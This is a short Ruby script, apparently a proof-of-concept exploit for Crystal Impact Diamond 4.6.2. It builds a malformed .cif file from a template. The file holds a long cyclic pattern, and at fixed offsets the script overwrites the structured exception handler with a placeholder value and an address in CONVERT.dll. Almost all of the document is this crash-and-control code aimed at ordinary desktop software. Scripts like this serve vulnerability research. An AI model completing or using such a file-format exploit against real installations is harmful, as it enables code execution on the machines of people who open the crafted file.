#!/usr/bin/env ruby
# https://www.crystalimpact.com/diamond/download.htm
# Diamond Version 4.6.2
# execption handler is controlled when the application processes a invalid
# .cif file.
require 'rex'

fd = File.open("template.cif", "rb" )
new_cif = fd.read(fd.stat.size)
fd.close

data = Rex::Text.pattern_create(9024)
data[1032, 4] = [0x42424242].pack('V')
data[1036, 4] = [0x10014456].pack('V') # CONVERT.dll

fuzz = new_cif

x = File.new("fuzz.cif","wb")
x.write(fuzz.gsub(/FUZZER/, data))
x.close
